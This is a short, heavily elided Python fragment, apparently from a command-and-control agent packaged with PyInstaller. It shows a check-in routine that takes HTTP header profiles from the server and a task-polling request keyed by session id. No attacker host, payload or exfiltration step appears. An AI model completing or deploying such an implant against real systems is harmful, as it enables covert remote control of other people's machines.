# pyinstaller --onefile HTTP_RSA.py
...
def checkin():
    ...
    try:
        ...
        get_headers_raw = data.get("gh", "")
        post_headers_raw = data.get("ph", "")

        GET_CLIENT_HEADERS.clear()
        GET_CLIENT_HEADERS.update(parse_headers(get_headers_raw))

        POST_CLIENT_HEADERS.clear()
        POST_CLIENT_HEADERS.update(parse_headers(post_headers_raw))
...
def get_tasks():
    ...
    payload = {"action": "get_tasks", "sid": session_id}
